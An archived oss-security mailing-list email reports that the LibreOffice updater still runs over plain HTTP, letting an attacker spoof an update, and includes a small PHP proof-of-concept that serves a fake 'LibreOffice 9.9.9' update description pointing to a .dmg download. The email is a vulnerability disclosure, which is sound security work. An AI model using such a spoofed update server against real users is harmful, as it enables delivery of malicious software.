X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1160" "Tuesday" "9" "February" "2016" "02:56:28" "+0000" "Sevan Janiyan" "venture37@geeklan.co.uk" "<56B9555C.9090009@geeklan.co.uk>" "33" "[oss-security] Libreoffice updater runs over http" nil nil nil "2" "2016020902:56:28" "[oss-security] Libreoffice updater runs over http" (number mark "U       venture37@ge Feb  9   33/1160  " thread-indent "\"[oss-security] Libreoffice updater runs over http\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15662 invoked by uid 550); 9 Feb 2016 02:56:48 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 15622 invoked from network); 9 Feb 2016 02:56:43 -0000
To: oss-security@lists.openwall.com
From: Sevan Janiyan <venture37@geeklan.co.uk>
X-Enigmail-Draft-Status: N1110
Message-ID: <56B9555C.9090009@geeklan.co.uk>
Date: Tue, 9 Feb 2016 02:56:28 +0000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:38.0)
 Gecko/20100101 Thunderbird/38.5.1
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit
Subject: [oss-security] Libreoffice updater runs over http

Hi,
Looking into the validity of an issue which was reported[1] a couple of
years back, it seems that it's still possible to spoof the availability
of an update for LibreOffice.

Unfortunately, I've not been able to get the download to happen as I
need to look into what happens when the application requests PROPFIND
/check.php?pkgfmt=dmg HTTP/1.1
At this point the download is marked as stalled whilst attempting to
download LibreOffice 9.9.9 I'd announced.

Though the original report used Windows, I repeated on OS X trying to
see if libreoffice could just download a mp4 video, later changed to a dmg.
Using the following check.php
<?php
echo '<?xml version="1.0" encoding="utf-8"?>
<inst:description xmlns:inst="http://update.libreoffice.org/description">
<inst:id>LibreOffice 9.9.9</inst:id>
<inst:gitid>123456789</inst:gitid>
<inst:os>MacOSX</inst:os>
<inst:arch>x86</inst:arch>
<inst:version>9.9.9</inst:version>
<inst:buildid>9999</inst:buildid>
<inst:update type="application/octet-stream"
src="http://update.libreoffice.org/update.dmg"/>
</inst:description>';
?>

Is this of concern at this stage?


Sevan
[1] http://www.waraxe.us/advisory-99.html
